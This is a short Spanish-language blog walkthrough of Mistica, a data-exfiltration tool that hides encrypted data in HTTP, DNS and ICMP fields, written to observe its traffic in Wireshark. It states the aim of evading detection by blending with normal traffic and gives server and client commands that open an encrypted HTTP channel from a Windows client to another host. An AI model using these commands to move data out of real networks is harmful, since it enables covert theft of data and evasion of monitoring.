---
title: Data Exfiltration - Mistica
date: 2021-01-08 19:17:00 Z
---

![Mistica.png]({{site.baseurl}}/images/Mistica/Mistica.png)

[https://github.com/IncideDigital/Mistica](https://github.com/IncideDigital/Mistica)


Mistica is a tool that allows to **embed data into application layer protocol fields**, with the g**oal of establishing a bi-directional channel for arbitrary communications**. Currently, **encapsulation into HTTP, DNS and ICMP protocols** has been implemented, but more protocols are expected to be introduced in the near future.


Mística has a modular design, **built around a custom transport protocol, called SOTP**: Simple Overlay Transport Protocol. **Data is encrypted, chunked and put into SOTP packets. SOTP packets are encoded and embedded into the desired field of the application protocol, and sent to the other end.**


SOTP, cifra los datos en pequeños bloques y los introduce en protocolos de aplicación.
Podemos partir un fichero en cachitos y transportarlo en SOTP. 

Dota a nuestros canales con unas características especiales para poderlo encapsular el protocolo SOTP, en los protocolos DNS,ICMP.

Aparte, tienes unas características esenciales, es bidereccional, cifrado y confidencial.

Uno de los creadores, lo documenta mucho mejor que yo:
[https://www.youtube.com/watch?v=xMNAhPkyRmc](https://www.youtube.com/watch?v=xMNAhPkyRmc)

Otra referencia sobre la herramienta
[https://darkbyte.net/jugando-con-remote-shells-parte-iii-mistica/](https://darkbyte.net/jugando-con-remote-shells-parte-iii-mistica/)


El objetivo será mostrar el funcionamiento de los diferentes protocolos.
Y ver la información y rastro que nos muestra WireShark.

***No soy un experto ni mucho menos.**

### Encapsulación HTTP

La comunicación se producirá a través del protocolo web http, con el objetivo de evitar detecciones, intentaremos mezclamos con el tráfico existente.


Este protocolo es muy utilizado por los chungos, ya que hay procesos internos en entornos Windows que utilizan este protocolo, como las actualizaciones de Windows.


Como veremos en los siguientes ejemplos, haremos uso de las propiedades de HTTP, como son las cabeceras e introduciremos los datos.


Más información: [https://attack.mitre.org/techniques/T1071/001/](https://attack.mitre.org/techniques/T1071/001/)

Servidor

`
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k Key
`

Cliente

`
python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80" -k key
`